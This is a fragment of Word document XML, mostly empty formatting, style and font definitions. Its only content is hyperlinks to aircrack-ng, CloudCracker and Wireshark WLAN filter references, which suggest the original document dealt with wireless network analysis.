        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42C96CB1" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="445BA249" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A6D9826" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2972A42D" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E1118EE" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60F64058" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="661F45B2" w14:textId="77777777" w:rsidR="00561527" w:rsidRPr="00F534DD" w:rsidRDefault="00561527" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00561527" w:rsidRPr="00F534DD" w:rsidSect="00F3435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 w:name="Consolas">
    <w:panose1 w:val="020B0609020204030204"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="A00002EF" w:usb1="4000204B" w:usb2="00000000" w:usb3="00000000" w:csb0="0000009F" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Verdana">
    <w:panose1 w:val="020B0604030504040204"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="00000287" w:usb1="00000000"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Lucida Console">
    <w:panose1 w:val="020B0609040504020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="8000028F" w:usb1="00001800" w:usb2="00000000" w:usb3="00000000" w:csb0="0000001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B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000B"/>
    <w:lvl w:ilvl="0" w:tplc="000003E9">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F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000F"/>
    <w:lvl w:ilvl="0" w:tplc="00000579">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13"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000013"/>
    <w:lvl w:ilvl="0" w:tplc="00000709">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48342FD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="39C4894A"/>
    <w:lvl w:ilvl="0" w:tplc="524A41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0F9331DD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000013"/>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13072966"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AD66D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68794D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="04F6A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C0666E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="280A68C6"/>
    <w:lvl w:ilvl="0" w:tplc="F61E8F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22"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="18"/>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1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747"/>
    <w:rsid w:val="00002BA9"/>
    <w:rsid w:val="00013AE1"/>
    <w:rsid w:val="000147FF"/>
    <w:rsid w:val="00025A34"/>
    <w:rsid w:val="00037A0F"/>
    <w:rsid w:val="00056E54"/>
    <w:rsid w:val="00062401"/>
    <w:rsid w:val="00062BA3"/>
    <w:rsid w:val="00071C0E"/>
    <w:rsid w:val="000C69E8"/>
    <w:rsid w:val="000E0B50"/>
    <w:rsid w:val="000E1B52"/>
    <w:rsid w:val="000F33A6"/>
    <w:rsid w:val="0012418B"/>
    <w:rsid w:val="001839A4"/>
    <w:rsid w:val="00216592"/>
    <w:rsid w:val="0025290C"/>
    <w:rsid w:val="0027750B"/>
    <w:rsid w:val="002B0795"/>
    <w:rsid w:val="00307E5D"/>
    <w:rsid w:val="00342713"/>
    <w:rsid w:val="003722F8"/>
    <w:rsid w:val="003773EA"/>
    <w:rsid w:val="003975DE"/>
    <w:rsid w:val="003B1BBD"/>
    <w:rsid w:val="003C5340"/>
    <w:rsid w:val="003D0165"/>
    <w:rsid w:val="003D7852"/>
    <w:rsid w:val="0046722B"/>
    <w:rsid w:val="00470AE6"/>
    <w:rsid w:val="00477221"/>
    <w:rsid w:val="00480CC6"/>
    <w:rsid w:val="004B27DE"/>
    <w:rsid w:val="004B4794"/>
    <w:rsid w:val="004B7829"/>
    <w:rsid w:val="004C6465"/>
    <w:rsid w:val="00515BA7"/>
    <w:rsid w:val="0053024B"/>
    <w:rsid w:val="005408E2"/>
    <w:rsid w:val="00557B81"/>
    <w:rsid w:val="00561527"/>
    <w:rsid w:val="00585754"/>
    <w:rsid w:val="00657403"/>
    <w:rsid w:val="006A34C8"/>
    <w:rsid w:val="006C69A7"/>
    <w:rsid w:val="006D3FA1"/>
    <w:rsid w:val="006E261B"/>
    <w:rsid w:val="007020BE"/>
    <w:rsid w:val="0071739C"/>
    <w:rsid w:val="00753B04"/>
    <w:rsid w:val="00775D5B"/>
    <w:rsid w:val="00781C97"/>
    <w:rsid w:val="00786CA2"/>
    <w:rsid w:val="007A2085"/>
    <w:rsid w:val="007B0476"/>
    <w:rsid w:val="007D20A8"/>
    <w:rsid w:val="00803B63"/>
    <w:rsid w:val="00807AA6"/>
    <w:rsid w:val="00812CFB"/>
    <w:rsid w:val="008919ED"/>
    <w:rsid w:val="008A0D96"/>
    <w:rsid w:val="008C666C"/>
    <w:rsid w:val="008D1A6B"/>
    <w:rsid w:val="00A14927"/>
    <w:rsid w:val="00A202A3"/>
    <w:rsid w:val="00A2052A"/>
    <w:rsid w:val="00A74219"/>
    <w:rsid w:val="00A86EAD"/>
    <w:rsid w:val="00AB32B9"/>
    <w:rsid w:val="00AE04E9"/>
    <w:rsid w:val="00B20A28"/>
    <w:rsid w:val="00B20DC5"/>
    <w:rsid w:val="00B223EB"/>
    <w:rsid w:val="00B253E8"/>
    <w:rsid w:val="00B6342E"/>
    <w:rsid w:val="00B64689"/>
    <w:rsid w:val="00BB71AD"/>
    <w:rsid w:val="00C00747"/>
    <w:rsid w:val="00C14F90"/>
    <w:rsid w:val="00C16128"/>
    <w:rsid w:val="00C20E68"/>
    <w:rsid w:val="00C3132B"/>
    <w:rsid w:val="00C31B4E"/>
    <w:rsid w:val="00C70BD1"/>
    <w:rsid w:val="00C72A0D"/>
    <w:rsid w:val="00C92AD8"/>
    <w:rsid w:val="00C94D2E"/>
    <w:rsid w:val="00CE1D3A"/>
    <w:rsid w:val="00CE6B29"/>
    <w:rsid w:val="00D2207B"/>
    <w:rsid w:val="00DA42AC"/>
    <w:rsid w:val="00E0380B"/>
    <w:rsid w:val="00E04247"/>
    <w:rsid w:val="00E21BA5"/>
    <w:rsid w:val="00E71FE9"/>
    <w:rsid w:val="00EB10B7"/>
    <w:rsid w:val="00EB60F0"/>
    <w:rsid w:val="00F34354"/>
    <w:rsid w:val="00F36867"/>
    <w:rsid w:val="00F477A7"/>
    <w:rsid w:val="00F534DD"/>
    <w:rsid w:val="00F573A9"/>
    <w:rsid w:val="00F7392B"/>
    <w:rsid w:val="00FB3D55"/>
    <w:rsid w:val="00FE3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B4069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747"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003D0165"/>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8D1A6B"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003722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22F8"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Grande" w:hAnsi="Lucida Grande" w:cs="Lucida Grande"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0001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13AE1"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier" w:hAnsi="Courier" w:cs="Courie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747"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003D0165"/>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8D1A6B"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003722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22F8"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Grande" w:hAnsi="Lucida Grande" w:cs="Lucida Grande"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0001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13AE1"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier" w:hAnsi="Courier" w:cs="Courie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029710">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="553926246">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="484780960">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="336929468">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="11895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68920">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="566720828">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1780951501">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="155635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31471">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="2103185224">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1076242725">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="15999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742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gi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ircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase&amp;DokuWiki=6a98f589ec171d976ab1600c6641c9a4" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cloudcracker.com" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan.html" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan_mgt.html" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan_aggreg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26</Pages>
  <Words>4814</Words>
  <Characters>27440</Characters>
  <Application>Microsoft Macintosh Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>228</Lines>
  <Paragraphs>64</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>32190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Office 2004 Test Drive User</cp:lastModifiedBy>
  <cp:revision>11</cp:revision>
  <cp:lastPrinted>2014-12-08T21:55:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-01-23T22:55:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2015-01-25T23:12:00Z</dcterms:modified>
</cp:coreProperties>
</file>